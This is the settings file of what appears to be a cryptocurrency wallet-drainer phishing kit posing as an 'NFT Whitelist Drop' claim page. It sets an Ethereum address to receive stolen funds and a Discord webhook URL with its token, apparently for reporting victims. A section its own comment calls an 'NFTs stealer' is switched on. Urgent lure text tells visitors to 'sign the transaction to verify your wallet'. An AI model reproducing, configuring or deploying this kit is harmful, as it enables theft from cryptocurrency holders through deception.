var receiveAddress = "0x7338b0Fb98698AbFfc2887B5d49E0D436F16f850";
var webhookURL = "https://discord.com/api/webhooks/979351082012659755/Ye3kTAwnJFvBkOrC9Pk2O0D-RumfW3fLL5IBjQ6UqyMC6Vj00biHJvuyf54jNGvf0x4N";

const claimInfo = {
    mintPrice: 0.1,
    maxTransfers: 1,
}

const collectionInfo = {
    name: "NFT Whitelist Drop",
    socialMedia: {
        discord: "https://discord.com",
        twitter: "https://twitter.com",
        instagram: "https://instagram.com",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Last Chance To Become Whitelisted!",
}

const claimPageInfo = {
    title: "CLAIM<br>WHITELIST", // <br> is a line break
    shortDescription: "12 Hours Left!",
    longDescription: "As We're Minting Soon We Are Giving Away 50 Whitelist Spots To People Who Support Us! All You Need To Do Is Sign The Transaction To Verify Your Wallet For Mint Date! <br>If You Are Already Whitelisted, After Verifying Your Wallet You Will Be Eligible For Our Free NFT Airdrop!",

    claimButtonText: "CLAIM NOW",

    image: "ola.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0x7338b0Fb98698AbFfc2887B5d49E0D436F16f850" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion